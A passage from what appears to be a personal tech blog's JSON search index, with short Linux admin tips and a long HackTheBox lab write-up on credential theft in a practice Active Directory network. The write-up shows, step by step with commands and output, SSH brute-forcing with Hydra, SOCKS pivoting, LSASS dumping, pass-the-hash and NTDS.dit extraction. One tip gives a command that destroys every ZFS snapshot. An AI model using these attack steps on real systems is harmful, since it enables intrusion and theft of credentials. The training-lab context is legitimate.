\u0026#39;s`TEXT`REPLACEMENT_TEXT`g\u0026#39; test.txt ","date":"2023-11-23","id":18,"permalink":"/blog/00_legacy_sed_alternate_delimeters/","summary":"Sometimes when trying to replace text using the sed command line tool you will tun into the issue in which your text has the forward slash characters which can be a bit of a headache because thats what sed uses to delimit strings. Thankfully the delimiter is pretty flexible. I like to use the pipe \u0026ldquo;|\u0026rdquo; symbol, but pretty much any other symbol will work such as the tilde \u0026ldquo;`\u0026rdquo; or the colon \u0026ldquo;:\u0026rdquo; ex:","tags":["sed","delimiters","linux","Legacy"],"title":"Sed alternate delimiters"},{"content":"In order to get proper email notifications from the TP-link Omada SDN Controller you need to set up SMTP and have it authenticate to your email provider of choice (here we\u0026rsquo;re gong to use gmail). This tutorial is assuming that you have a google domain because you use the google SMTP servers to send your mail. Gmail allows application access to SMTP functions pretty seamlessly so this whole evolution takes like 5 mins.\nEmail Application Setup# To start, go to the Google applications dashboard: https://myaccount.google.com/ Next click the Security tab then go to Signing in to Google \u0026gt; App Passwords You will most likely be asked to re-authenicate, but from there you will Click the Select app dropdown and select Mail. Then in the Select device dropdown click other Give it a name you will remember, something like: [DOMAIN] (Omada). Omada SMTP Setup# From there in the Omada SDN Controller go to Settings \u0026gt; Controller \u0026gt; Mail Server and enable the mail server. From there fill out the fields as such and test your configuration: Port: This should be 465 if you are using SMTP over TLS.\nSSL: Always use SSL.\nAuthentication: Authentication is required to use google SMTP servers.\nUsername: This is the gmail account you used to create the app password.\nPassword: This is the app password generated in the previous step\nSender Address: This is the custom address you would like to send the email from.\n","date":"2023-11-23","id":19,"permalink":"/blog/00_legacy_setup_omada_gmail/","summary":"In order to get proper email notifications from the TP-link Omada SDN Controller you need to set up SMTP and have it authenticate to your email provider of choice (here we\u0026rsquo;re gong to use gmail). This tutorial is assuming that you have a google domain because you use the google SMTP servers to send your mail. Gmail allows application access to SMTP functions pretty seamlessly so this whole evolution takes like 5 mins.","tags":["TPlink","Omada","SDN","Email","Legacy"],"title":"Setting Up Omada SMTP with Gmail"},{"content":"So i was trying to make a script that would automate SSL key exports from a BSD machine to another so I don\u0026rsquo;t have to go through the pain of doing it manually every time and i ran into the issue of me not being able to ssh-copy-id my files over but i keep running into the issue of it not being able to connect to my auth agent due to a lack of keys even though i generated them with ssh-keygen, nonetheless no matter what I did i kept getting met with:\nCould not open a connection to your authentication agent.\rno keys found The fix to this is pretty simple. What i found is that i was being spoiled by Linux so i never really had to add keys to my ssh-agent, but you may have to start with getting your ssh-agent right using\neval `ssh-agent -c` Which will generate C-shell commands on stdout. Next you just simply add your key to the agent using\nssh-add ~/.ssh/id_rsa ","date":"2023-11-23","id":20,"permalink":"/blog/00_legacy_ssh_agent_issues/","summary":"So i was trying to make a script that would automate SSL key exports from a BSD machine to another so I don\u0026rsquo;t have to go through the pain of doing it manually every time and i ran into the issue of me not being able to ssh-copy-id my files over but i keep running into the issue of it not being able to connect to my auth agent due to a lack of keys even though i generated them with ssh-keygen, nonetheless no matter what I did i kept getting met with:","tags":["SSH","SSH Agent","FreeBSD","Legacy"],"title":"SSH Auth Agent issues on FreeBSD"},{"content":"Just a quick example of how to use dd to test drive read/write speed. NOTE: Dont do this a lot or you could shorten the live of your drive since youre making arbitrary writes.\nReading# sudo dd if=/dev/zero of=/tmp/test.img bs=1G count=1 oflag=dsync This command will write 1G of zeros to an arbitrary file of your choosing. Feel free to delete it when you\u0026rsquo;re done.\nYour output will look a little like this.\n1+0 records in\r1+0 records out\r1073741824 bytes (1.1 GB, 1.0 GiB) copied, 1.09503 s, 981 MB/s Writing# sudo dd if=/tmp/test.img of=/dev/zero bs=8k This command will read that same file in 8k chunks similar to how your normal file reads/writes are.\nYour output will look a little like this.\n131072+0 records in\r131072+0 records out\r1073741824 bytes (1.1 GB, 1.0 GiB) copied, 2.13873 s, 502 MB/s P.S. This is just a test with a bunch of zeros to get a ballpark of your drive speeds. Actual speeds will look different depending on the workload.\n","date":"2023-11-23","id":21,"permalink":"/blog/00_legacy_testing_drive_read_write/","summary":"Just a quick example of how to use dd to test drive read/write speed. NOTE: Dont do this a lot or you could shorten the live of your drive since youre making arbitrary writes.\nReading# sudo dd if=/dev/zero of=/tmp/test.img bs=1G count=1 oflag=dsync This command will write 1G of zeros to an arbitrary file of your choosing. Feel free to delete it when you\u0026rsquo;re done.\nYour output will look a little like this.","tags":["DD","Drives","Linux","Legacy"],"title":"Testing Drive Read/Write Speed Via Terminal"},{"content":"The Problem# When installing Ubuntu Server with the LVM option in the default partitioning options, it will often only use a fraction of the actual disk space you have available. Thankfully LVM is flexible enough to extend this partition without causing any huge issues to your operating system. In this writeup, I\u0026rsquo;m gonna extend a 15G volume to a 200G volume on my Ubuntu 22.04.3 LTS VM.\nuser@ubuntu:~$ lsblk\rNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTS\rloop0 7:0 0 55M 1 loop /snap/core18/1880\rloop1 7:1 0 55.7M 1 loop /snap/core18/2812\rloop2 7:2 0 63.9M 1 loop /snap/core20/2105\rloop3 7:3 0 74.1M 1 loop /snap/core22/1033\rloop4 7:4 0 71.3M 1 loop /snap/lxd/16099\rloop5 7:5 0 91.8M 1 loop /snap/lxd/24061\rloop6 7:6 0 40.9M 1 loop /snap/snapd/20290\rsda 8:0 0 200G 0 disk ├─sda1 8:1 0 1M 0 part ├─sda2 8:2 0 1G 0 part /boot\r└─sda3 8:3 0 199G 0 part └─ubuntu--vg-ubuntu--lv 253:0 0 15G 0 lvm /\rsr0 11:0 1 4.5G 0 rom user@ubuntu:~$ df -h\rFilesystem Size Used Avail Use% Mounted on\rtmpfs 794M 1.7M 793M 1% /run\r/dev/mapper/ubuntu--vg-ubuntu--lv 15G 14G 497M 97% /\rtmpfs 3.9G 0 3.9G 0% /dev/shm\rtmpfs 5.0M 0 5.0M 0% /run/lock\r/dev/sda2 974M 223M 684M 25% /boot\rtmpfs 794M 16K 794M 1% /run/user/1000 The Fix# First, let\u0026rsquo;s ensure that our physical volume is correctly sized, this command won\u0026rsquo;t really do much if it is, but ts worth running just to be sure.\nuser@ubuntu:~$ sudo pvresize /dev/sda3\rPhysical volume \u0026#34;/dev/sda3\u0026#34; changed\r1 physical volume(s) resized or updated / 0 physical volume(s) not resized\ruser@ubuntu:~$ sudo pvdisplay\r--- Physical volume ---\rPV Name /dev/sda3\rVG Name ubuntu-vg\rPV Size \u0026lt;199.00 GiB / not usable 16.50 KiB\rAllocatable yes PE Size 4.00 MiB\rTotal PE 50943\rFree PE 47104\rAllocated PE 3839\rPV UUID cJAk5B-AR3A-PYh2-muKW-ZaOm-3T0u-Fo7VWz Now, we need to resize the volume itself to consume 100% of the free space and not just the 15G that it\u0026rsquo;s using now.\nuser@ubuntu:~$ sudo lvextend -l +100%FREE /dev/ubuntu-vg/ubuntu-lv\rSize of logical volume ubuntu-vg/ubuntu-lv changed from \u0026lt;15.00 GiB (3839 extents) to \u0026lt;199.00 GiB (50943 extents).\rLogical volume ubuntu-vg/ubuntu-lv successfully resized.\ruser@ubuntu:~$ sudo lvdisplay\r--- Logical volume ---\rLV Path /dev/ubuntu-vg/ubuntu-lv\rLV Name ubuntu-lv\rVG Name ubuntu-vg\rLV UUID n55bW0-FSzX-2CGy-FB4J-8n6G-DpmA-yr2Ll6\rLV Write Access read/write\rLV Creation host, time ubuntu-server, 2021-07-13 22:47:18 +0000\rLV Status available\r# open 1\rLV Size \u0026lt;199.00 GiB\rCurrent LE 50943\rSegments 1\rAllocation inherit\rRead ahead sectors auto\r- currently set to 256\rBlock device 253:0 Now we need to go into the file system and extend it with this newfound space.\nuser@ubuntu:~$ sudo resize2fs /dev/mapper/ubuntu--vg-ubuntu--lv\rresize2fs 1.46.5 (30-Dec-2021)\rFilesystem at /dev/mapper/ubuntu--vg-ubuntu--lv is mounted on /; on-line resizing required\rold_desc_blocks = 2, new_desc_blocks = 25\rThe filesystem on /dev/mapper/ubuntu--vg-ubuntu--lv is now 52165632 (4k) blocks long. Now we can check our work.\nuser@ubuntu:~$ df -h\rFilesystem Size Used Avail Use% Mounted on\rtmpfs 794M 1.7M 793M 1% /run\r/dev/mapper/ubuntu--vg-ubuntu--lv 196G 14G 175G 8% /\rtmpfs 3.9G 0 3.9G 0% /dev/shm\rtmpfs 5.0M 0 5.0M 0% /run/lock\r/dev/sda2 974M 223M 684M 25% /boot\rtmpfs 794M 16K 794M 1% /run/user/1000\ruser@ubuntu:~$ lsblk\rNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTS\rloop0 7:0 0 55.7M 1 loop /snap/core18/2812\rloop1 7:1 0 55M 1 loop /snap/core18/1880\rloop2 7:2 0 63.9M 1 loop /snap/core20/2105\rloop3 7:3 0 74.1M 1 loop /snap/core22/1033\rloop4 7:4 0 71.3M 1 loop /snap/lxd/16099\rloop5 7:5 0 91.8M 1 loop /snap/lxd/24061\rloop6 7:6 0 40.9M 1 loop /snap/snapd/20290\rsda 8:0 0 200G 0 disk ├─sda1 8:1 0 1M 0 part ├─sda2 8:2 0 1G 0 part /boot\r└─sda3 8:3 0 199G 0 part └─ubuntu--vg-ubuntu--lv 253:0 0 199G 0 lvm /\rsr0 11:0 1 4.5G 0 rom ","date":"2023-11-23","id":22,"permalink":"/blog/00_legacy_ubuntu_lvm_partitioning/","summary":"The Problem# When installing Ubuntu Server with the LVM option in the default partitioning options, it will often only use a fraction of the actual disk space you have available. Thankfully LVM is flexible enough to extend this partition without causing any huge issues to your operating system. In this writeup, I\u0026rsquo;m gonna extend a 15G volume to a 200G volume on my Ubuntu 22.04.3 LTS VM.\nuser@ubuntu:~$ lsblk\rNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTS\rloop0 7:0 0 55M 1 loop /snap/core18/1880\rloop1 7:1 0 55.","tags":["Ubuntu","lvm","Virtual Machines","Legacy"],"title":"Ubuntu LVM Improper Partitioning"},{"content":"After upgrading my Ubuntu Version and subsequently my kernel I tried running VMware Workstation Pro so I could access my VMs and kept running into the following error code when trying to open the application. Unfortunately, there was no way around it as rebooting, uninstalling/reinstalling, and anything else in my usual low-hanging fruit bag of tricks didn\u0026rsquo;t work so I had to really figure out what was really going on. Lets start with the actual error.\n​2022-06-27T12:00:00.000+01:00| vthread-1| W100: Failed to build vmmon. Failed to execute the build command.\r2022-06-27T12:00:00.000+01:00| vthread-1| W100: Failed to build vmnet. Failed to execute the build command. From here we can see that vmmon and vmnet which are two kernel modules that VMware needs to run are having issues building, this is because the VMware Linux app likes to think its smarter than it actually is, and its most likely using the wrong package for your kernel which means we can just avoid this auto check and install it ourselves\nWhat you actually came for# To begin we\u0026rsquo;re going to make sure you have the appropriate packages installed so the rest of this isn\u0026rsquo;t for nothing. This part is Ubuntu-specific, but just swap out apt for whatever package manager fits your distro. sudo apt install gcc\rsudo apt install build-essentials Visit this GitHub page and make sure you download the package for your specific version of Vmware Workstation AND kernel version (up until the point release ex. 5.12). From here extract the file contents and enter the directory. Run the following command to create archives of the modules tar -cvf vmmon.tar vmmon-only\rtar -cvf vmnet.tar vmnet-only Move the files into your cmware modules folder sudo mv vmmon.tar vmnet.tar /usr/lib/vmware/modules/source/ Install your modules sudo vmware-modconfig --console --install-all All done, go ahead and start VMware Workstation. ","date":"2023-11-23","id":23,"permalink":"/blog/00_legacy_vmware_vmod_install/","summary":"After upgrading my Ubuntu Version and subsequently my kernel I tried running VMware Workstation Pro so I could access my VMs and kept running into the following error code when trying to open the application. Unfortunately, there was no way around it as rebooting, uninstalling/reinstalling, and anything else in my usual low-hanging fruit bag of tricks didn\u0026rsquo;t work so I had to really figure out what was really going on. Lets start with the actual error.","tags":["HomeAssistant","Web Apps","NGINX","Legacy"],"title":"VMware Vmmod/VMnet Install"},{"content":"When utilizing debian based distros, I\u0026rsquo;ve run into this issue a lot when I\u0026rsquo;m trying to use wireguard and specify DNS settings:\n/usr/bin/wg-quick: line 31: resolvconf: command not found A lot of this is because of systemd has its own resolvconf so you can simply make a symlink to get wireguard running normally:\nsudo ln -s /usr/bin/resolvectl /usr/local/bin/resolvconf ","date":"2023-11-23","id":24,"permalink":"/blog/00_legacy_wireguard_dns_debian/","summary":"When utilizing debian based distros, I\u0026rsquo;ve run into this issue a lot when I\u0026rsquo;m trying to use wireguard and specify DNS settings:\n/usr/bin/wg-quick: line 31: resolvconf: command not found A lot of this is because of systemd has its own resolvconf so you can simply make a symlink to get wireguard running normally:\nsudo ln -s /usr/bin/resolvectl /usr/local/bin/resolvconf ","tags":["Wireguard","VPN","Debian","Legacy"],"title":"Wireguard DNS issues with Debian"},{"content":"Sometimes it\u0026rsquo;s good to have a nice purge of your ZFS snapshots, whether you\u0026rsquo;re pressed for space or you just feel like doing spring cleaning. The following command will clear all of your ZFS snapshots on your Ubuntu system.\nWarning: There is no recovery, all the cannonballs have been shot. Only do this if you know you\u0026rsquo;re in a stable state.\nsudo zfs list -H -o name -t snapshot | sudo xargs -n1 zfs destroy ","date":"2023-11-23","id":25,"permalink":"/blog/00_legacy_zfs_remove_snapshots/","summary":"Sometimes it\u0026rsquo;s good to have a nice purge of your ZFS snapshots, whether you\u0026rsquo;re pressed for space or you just feel like doing spring cleaning. The following command will clear all of your ZFS snapshots on your Ubuntu system.\nWarning: There is no recovery, all the cannonballs have been shot. Only do this if you know you\u0026rsquo;re in a stable state.\nsudo zfs list -H -o name -t snapshot | sudo xargs -n1 zfs destroy ","tags":["ZFS","snapshots","Legacy"],"title":"ZFS Remove All Snapshots"},{"content":"01. Intro# I was doing the Password Attacks lab in hackthebox academy and I found it pretty interesting so I figured I would redo it and step through how I did it and my thought process to help solidify concepts and because I enjoyed this one, even though it was a bit frustrating initially.\n02. Gathering Initial Info# To start this engagement we know a couple things. We have a user Betty Jade that works at Nexura LLC. We also have a password for the user Texas123!@# with a reasonable assumption that she reuses passwords. We also have the scope of this engagement with the following devices:\nHost IP Address DMZ01 10.129.39.174, 172.16.119.13 JUMP01 172.16.119.7 FILE01 172.16.119.10 DC01 172.16.119.11 03. Scanning the External Device# Since only one device in this network is publicly accessible, we can give it a quick scan to see what ports we have available for remote access.\nth@ddeu$ nmap -sS -p 21-23,80,135,443,445,3389,5985,5986,8080 -T4 -oA dmz01_scan 10.129.39.174\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-16 12:25 CDT\rNmap scan report for 10.129.39.174\rHost is up (0.012s latency).\rPORT STATE SERVICE\r21/tcp closed ftp\r22/tcp open ssh\r23/tcp closed telnet\r80/tcp closed http\r135/tcp closed msrpc\r443/tcp closed https\r445/tcp closed microsoft-ds\r3389/tcp closed ms-wbt-server\r5985/tcp closed wsman\r5986/tcp closed wsmans\r8080/tcp closed http-proxy\rNmap done: 1 IP address (1 host up) scanned in 1.27 seconds 04. Gaining Initial Access# From here we can see that SSH is open. Since we have a possible password but no username. We can create a list of possible usernames based on the name Betty Jayde using Username-Anarchy and brute forcing the resulting usernames using Hydra\nth@ddeu$ git clone https://github.com/urbanadventurer/username-anarchy.git\rth@ddeu$ cd username-anarchy\rth@ddeu$ ./username-anarchy Betty Jade \u0026gt; /tmp/bjade.txt\rth@ddeu$ hydra -L /tmp/bjade.txt -p \u0026#39;Texas123!@#\u0026#39; ssh://10.129.39.174\r--SNIP--\r[22][ssh] host: 10.129.39.174 login: jbetty password: Texas123!@#\r--SNIP-- Now we that we have a valid username and password we can log into the machine to verify access.\nth@ddeu$ ssh jbetty@10.129.39.174\rjbetty@DMZ01:~$ At this point we can see that we are on an Ubuntu 20.04 server. The user has no sudo privilges and if we do a list of the files available to this user we can see the following standard files\njbetty@DMZ01:~$ sudo -l\r[sudo] password for jbetty: Sorry, user jbetty may not run sudo on DMZ01.\rjbetty@DMZ01:~$ ll\rtotal 32\rdrwxr-xr-x 4 jbetty jbetty 4096 Jun 2 08:17 ./\rdrwxr-xr-x 4 root root 4096 May 30 11:35 ../\r-rw-r--r-- 1 jbetty jbetty 2139 Jun 2 08:19 .bash_history\r-rw-r--r-- 1 jbetty jbetty 220 Apr 29 13:20 .bash_logout\r-rw-r--r-- 1 jbetty jbetty 3771 Apr 29 13:20 .bashrc\rdrwx------ 2 jbetty jbetty 4096 May 30 11:35 .cache/\rdrwxrwxr-x 3 jbetty jbetty 4096 May 30 11:35 .local/\r-rw-r--r-- 1 jbetty jbetty 807 Apr 29 13:20 .profile Of these files, the only thing I can really think of to do is checking the bash history for any commands the user has run and maybe the profile files to see any potential startup scripts or environment variables of note\njbetty@DMZ01:~$ less -N .bash_history --SNIP--\r25 sshpass -p \u0026#34;dealer-screwed-gym1\u0026#34; ssh hwilliam@file01\r--SNIP--\r40 ssh user@192.168.0.101\r41 scp file.txt user@192.168.0.101:~/Documents/\r--SNIP--\r64 sudo adduser testuser\r65 sudo usermod -aG sudo testuser\r66 su - testuser\r--SNIP-- 05. Pivoting out of the DMZ# The testuser line seemed pretty interesting as we could potentially use that to get root access to this machine, unfortunately that user no longer exists. Next the 192.168.0.101 machine is out of scope. Lastly we can see potential credentials to FILE01, which is in scope. So when I first tried to go about this, i spent too much time trying to escalate privileges on this machine so that i could use chisel or to be able to ssh tunnel since that was locked down. Turns out all i needed to do was use the built in SSH SOCKS5 Proxy and proxychains my traffic through to the target machines.\nth@ddeu$ ssh -D 9050 jbetty@10.129.39.174\rth@ddeu$ sudo vim /etc/proxychains.conf\r# ENSURE YOUR CONFIG HAS THE FOLLOWING\r--SNIP--\r[ProxyList]\rsocks5 127.0.0.1 9050\r--SNIP--\r# THIS NEXT COMMAND WILL TAKE A SEC, GO DRINK WATER\rth@ddeu$ sudo proxychains nmap -Pn -sT -p 21-23,80,135,443,445,3389,5985,5986,8080 -T4 -oA internal_scan 172.16.119.7 172.16.119.10 172.16.119.11 --SNIP--\r21 RTTVAR has grown to over 2.3 seconds, decreasing to 2.0\r22 Nmap scan report for 172.16.119.7\r33 3389/tcp open ms-wbt-server\r34 5985/tcp open wsman\r37 38 Nmap scan report for 172.16.119.10\r46 135/tcp open msrpc\r48 445/tcp open microsoft-ds\r49 3389/tcp open ms-wbt-server\r50 5985/tcp open wsman\r53 54 Nmap scan report for 172.16.119.11\r62 135/tcp open msrpc\r64 445/tcp open microsoft-ds\r65 3389/tcp open ms-wbt-server\r66 5985/tcp open wsman 06. Gaining Access to FILE01# Lets Focus on the ports that we have open on FILE01, we can see that we can access this machine a few different ways, lets try the least intrusive method of checking the shares available first, and maybe connecting through psexec, we can also try to RDP but i typically save that for a last resort.\nth@ddeu$ sudo proxychains smbclient -U \u0026#34;NEXURA\\hwilliam%dealer-screwed-gym1\u0026#34; -L //172.16.119.10\r--SNIP--\rSharename Type Comment\r--------- ---- -------\rADMIN$ Disk Remote Admin\rC$ Disk Default share\rHR Disk IPC$ IPC Remote IPC\rIT Disk MANAGEMENT Disk PRIVATE Disk TRANSFER Disk --SNIP--\rth@ddeu$ sudo proxychains impacket-psexec NEXURA/hwilliam:dealer-screwed-gym1@172.16.119.10\r--SNIP--\r[*] Requesting shares on 172.16.119.10.....\r[-] share \u0026#39;ADMIN$\u0026#39; is not writable.\r[-] share \u0026#39;C$\u0026#39; is not writable.\r[*] Found writable share HR\r[*] Uploading file YDuMZAjX.exe\r[*] Opening SVCManager on 172.16.119.10.....\r[-] Error opening SVCManager on 172.16.119.10.....\r[-] Error performing the installation, cleaning up: Unable to open SVCManager\r--SNIP--\rth@ddeu$ proxychains xfreerdp /v:172.16.119.10 /d:nexura.htb /u:hwilliam /p:\u0026#39;dealer-screwed-gym1\u0026#39; /cert:ignore /dynamic-resolution /drive:linux,/home/th/filetransfer\r--SNIP--\r[14:04:26:177] [315880:315882] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 0: Success\r[14:04:26:177] [315880:315882] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]\r[proxychains] Strict chain ... 127.0.0.1:9050 ... 172.16.119.10:3389 ... OK\r[14:04:27:629] [315880:315882] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 0: Success\r[14:04:27:629] [315880:315882] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]\r[14:04:27:629] [315880:315882] [ERROR][com.freerdp.core] - freerdp_post_connect failed As we can see our remote access attempts did not work, so were just gonna take a look around the shares to see if theres anything of interest there. In the interest of time. This is an unprivileged user so i couldnt access the C$ or ADMIN$ shares so in the interest of brevity im gonna skip to the one that actually worked.\nth@ddeu$ sudo proxychains smbclient -U \u0026#34;NEXURA\\hwilliam%dealer-screwed-gym1\u0026#34; //172.16.119.10/HR\rsmb: \\\u0026gt; dir . D 0 Wed Jul 16 13:58:02 2025\r.. D 0 Wed Jul 16 13:58:02 2025\r2024 D 0 Tue Apr 29 11:08:16 2025\r2025 D 0 Tue Apr 29 11:07:24 2025 Archive D 0 Tue Apr 29 11:10:24 2025\rsmb: \\\u0026gt; cd Archive smb: \\Archive\\\u0026gt; dir --SNIP-- Employee-Passwords_OLD.plk A 48 Tue Apr 29 10:13:43 2025\rEmployee-Passwords_OLD.psafe3 A 1080 Tue Apr 29 10:09:57 2025 Employee-Passwords_OLD_011.ibak A 856 Tue Apr 29 10:10:02 2025\rEmployee-Passwords_OLD_012.ibak A 904 Tue Apr 29 10:10:04 2025\rEmployee-Passwords_OLD_013.ibak A 952 Tue Apr 29 10:10:07 2025\r--SNIP--\rsmb: \\Archive\\\u0026gt; mget Employee-Passwords* From here, doing some research into the psafe3 filestype uncovers a 2john tool that we can use on the file to extract hashes for cracking\nth@ddeu$ pwsafe2john ./Employee-Passwords_OLD.psafe3 \u0026gt; /tmp/employee_psafe.txt\rth@ddeu$ john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/employee_psafe.txt\r--SNIP--\rmichaeljackson (Employee-Passwords_OLD) --SNIP--\rth@ddeu$ sudo apt install passwordsafe\rth@ddeu$ From here we have to download the app and open the gui to copy and paste out the passwords. The resulting creds are as follows\n#DMZ01\r## jbetty / xiao-nicer-wheels5\r#Domain Users\r## bdavid / caramel-cigars-reply1\r## stom / fails-nibble-disturb4\r## hwilliam / warned-wobble-occur8 07. Gaining Access to JUMP01# Taking a look ath these creds, the only ones that are still valid are bdavid\u0026rsquo;s unfortunately his credentials dont give us access to any files of interest\nth@ddeu$ sudo proxychains smbclient -U \u0026#34;NEXURA\\bdavid%caramel-cigars-reply1\u0026#34; -L //172.16.119.10\r--SNIP--\rSharename Type Comment\r--------- ---- -------\rADMIN$ Disk Remote Admin\rC$ Disk Default share\rHR Disk IPC$ IPC Remote IPC\rIT Disk MANAGEMENT Disk PRIVATE Disk TRANSFER Disk --SNIP-- From here we can use our newly found credentials to attempt remote access to the other machines. For brevity\u0026rsquo;s sake im going to omit the numerous failed attempts, but i tried psexec and xfreerdp on both other machines with both sets of credentials, and was able to get on to the JUMP01 server with bdavid via rdp.\nth@ddeu$ proxychains xfreerdp /v:172.16.119.7 /d:nexura.htb /u:bdavid /p:\u0026#39;caramel-cigars-reply1\u0026#39; /cert:ignore /dynamic-resolution /drive:linux,/home/$USER/filetransfer A quick check shows us that bdavid is allowed to launch an administrative shell which makes our lives a lot easier. At this point we can upload mimikatz if we would like, but i wanted to try the method of dumping LSASS since for some reason it wouldnt work for me in the earlier labs using the GUI method in Task Manager The resulting dump was in C:\\Users\\bdavid\\AppData\\Local\\Temp\\lsass.DMP which I could move back to my machine using the drive that i mounted in the RDP command. With that out of the way I can grab new credentials using pypykatz. This is a pretty long file, but the lines of interest are here. Now we have a hash for stom\nth@ddeu$ pypykatz lsa minidump lsass.DMP | less -N\r--SNIP--\r76 == MSV ==\r77 Username: JUMP01$\r78 Domain: NEXURA\r79 LM: NA\r80 NT: fa04a67f5a8620d4ce87238f139a992b\r81 SHA1: 8d45e4af84cfe51b8a6f8f483e955f0b0f281abc\r82 DPAPI: 0000000000000000000000000000000000000000\r--SNIP--\r293 == MSV ==\r294 Username: stom\r295 Domain: NEXURA\r296 LM: NA\r297 NT: 21ea958524cfd9a7791737f8d2f764fa\r298 SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031\r299 DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000\r--SNIP-- At this point we only have the hash and if we cant PTH with RDP unless we enable restricted admin mode, so we will have to try other methods of gaining access to the domain controller. At this point i was going to try psexec or evil-winrm and psexec is a lot easier so i went with that then i enabled restricted admin mode and conected to the machine via RDP.\n08. Gaining Access to DC01# th@ddeu$ sudo proxychains impacket-psexec NEXURA/stom@172.16.119.10 -hashes :21ea958524cfd9a7791737f8d2f764fa\r--SNIP--\rMicrosoft Windows [Version 10.0.17763.2628]\r(c) 2018 Microsoft Corporation. All rights reserved.\rC:\\Windows\\system32\u0026gt; reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f\rth@ddeu$ proxychains xfreerdp /v:172.16.119.7 /d:nexura.htb /u:stom /pth:\u0026#39;21ea958524cfd9a7791737f8d2f764fa\u0026#39; /cert:ignore /dynamic-resolution /drive:linux,/home/$USER/filetransfer This did not work so im going to back out and use evil-winrm to connect to the machine\nth@ddeu$ sudo apt install krb5-user\rth@ddeu$ sudo vim /etc/krb5.conf\r# MAKE SURE YOUR CONF HAS THE FOLLOWING\r--SNIP--\rdefault_realm = NEXURA.HTB\r--SNIP--\r[realms]\rNEXURA.HTB = {\rkdc = DC01.NEXURA.HTB\r}\r--SNIP--\rth@ddeu$ sudo vim /etc/hosts\r--SNIP--\r#MAKE SURE YOUR FILE HAS THE FOLLOWING\r172.16.119.11 DC01 dc01 DC01.NEXURA.HTB dc01.nexura.htb NEXURA.HTB nexura.htb\r--SNIP--\rth@ddeu$ proxychains evil-winrm -i DC01 -u stom -H 21ea958524cfd9a7791737f8d2f764fa *Evil-WinRM* PS C:\\Users\\stom\\Documents\u0026gt; Now that we have access to the system we can try to grab the SYSTEM and ntds.dit files to dump them and get the administrator hash that we need to pass this lab.We can do this most easily by just creating a volume shadow copy and copying the files to our local system\n*Evil-WinRM* PS C:\\Users\\stom\\Documents\u0026gt; vssadmin CREATE SHADOW /for=C: vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool (C) Copyright 2001-2013 Microsoft Corp. Successfully created shadow copy for \u0026#39;C:\\\u0026#39; Shadow Copy ID: {1a19cedf-7113-402f-a03a-cfc2bf69bb9c} Shadow Copy Volume Name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 *Evil-WinRM* PS C:\\Users\\stom\\Documents\u0026gt; cmd.exe /C copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\NTDS.dit\r*Evil-WinRM* PS C:\\Users\\stom\\Documents\u0026gt; cmd.exe /C copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\Config\\SYSTEM C:\\SYSTEM\r# THIS TAKES A WHILE\r*Evil-WinRM* PS C:\\Users\\stom\\Documents\u0026gt; download C:\\ntds.dit\r*Evil-WinRM* PS C:\\Users\\stom\\Documents\u0026gt; download C:\\SYSTEM 09. Cracking the creds# Finally we can use secretsdump to grab the hash we need for this challenge\nth@ddeu$ impacket-secretsdump -ntds ./NTDS.dit -system ./SYSTEM LOCAL Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies\r[*] Target system bootKey: 0x76b4393403c75a0cb93633c17abf2778 [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\r[*] Searching for pekList, be patient\r[*] PEK # 0 found and decrypted: 9bf8b490fffee672ecfe3bc67e0daf69\r[*] Reading and decrypting hashes from ./NTDS.dit\rAdministrator:500:aad3b435b51404eeaad3b435b51404ee:36e09e1e6ade94d63fbcab5e5b8d6d23:::\rGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\rDC01$:1002:aad3b435b51404eeaad3b435b51404ee:9d80cee28b2e985285a43a7c4eb3122c:::\rkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:11dee8f685882eb4f78a450291569bd0:::\rnexura.htb\\bdavid:1105:aad3b435b51404eeaad3b435b51404ee:82c5ef7f2612567964070d04fe46a5d0:::\rnexura.htb\\stom:1106:aad3b435b51404eeaad3b435b51404ee:21ea958524cfd9a7791737f8d2f764fa::: nexura.htb\\hwilliam:1107:aad3b435b51404eeaad3b435b51404ee:f3ac86b290a51fb59a1a66f50b658e1f:::\rFILE01$:1108:aad3b435b51404eeaad3b435b51404ee:b7374a9de2bf6951a5c66a7675df7f2f:::\rJUMP01$:1109:aad3b435b51404eeaad3b435b51404ee:7bef0ee0b472d2c5805921324525f321::: ","date":"0001-01-01","id":26,"permalink":"/blog/20250716/","summary":"01. Intro# I was doing the Password Attacks lab in hackthebox academy and I found it pretty interesting so I figured I would redo it and step through how I did it and my thought process to help solidify concepts and because I enjoyed this one, even though it was a bit frustrating initially.\n02. Gathering Initial Info# To start this engagement we know a couple things. We have a user Betty Jade that works at Nexura LLC.","tags":["Hackthebox","Password Attacks","Pivoting","Pass The Hash","Acrive Directory"],"title":"The Credential Theft Shuffle"}]